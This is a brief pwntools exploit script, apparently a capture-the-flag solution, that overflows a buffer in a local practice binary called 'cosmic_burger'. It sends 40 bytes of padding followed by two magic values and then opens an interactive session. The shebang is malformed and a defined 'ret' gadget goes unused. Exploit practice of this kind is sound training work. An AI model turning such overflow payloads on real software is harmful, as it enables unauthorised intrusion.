#!usr/bin/env python3

from pwn import *

context.binary =elf=ELF("./cosmic_burger",checksec=False)

p = process(elf.path)

offset = 40 
ret= 0x000000000000101a

param1 = 0xBEEF
param2 = 0xF00D

p.recvuntil(b"What's your order?")

payload= flat(
    b"A" * offset,
    p32(param2),
    p32(param1)
)
p.send(payload)
p.interactive()

#0x6161616c offset= 44 , 0x6161616b offset = 40
